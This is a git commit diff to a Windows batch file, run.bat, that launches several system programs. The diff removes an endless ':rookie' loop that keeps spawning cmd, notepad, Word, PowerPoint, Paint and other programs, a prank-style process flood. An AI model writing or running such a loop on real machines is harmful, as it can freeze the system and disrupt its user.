d8b08d38fd2cc6b543ee675b7b92be7d8717da4f
ilovecodeing123456799 <90834028+ilovecodeing123456799@users.noreply.github.com>
2022-11-19 12:21:02 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -12,17 +12,4 @@ start %systemroot%\system32\control.exe
 start %systemroot%\system32\write.exe
 start %systemroot%\winhlp32.exe
 start %systemroot%\Boot\DVD\PCAT\etfsboot.com
-@echo off
-:rookie
-start %systemroot%\system32\notepad.exe
-start %systemroot%\system32\cmd.exe
-start %systemroot%\system32\control.exe
-start %systemroot%\system32\write.exe
-start %systemroot%\winhlp32.exe
-start %systemroot%\Boot\DVD\PCAT\etfsboot.com
-start winword
-start cmd
-start powerpnt
-start pbrush
-start notepad
-goto rookie
+
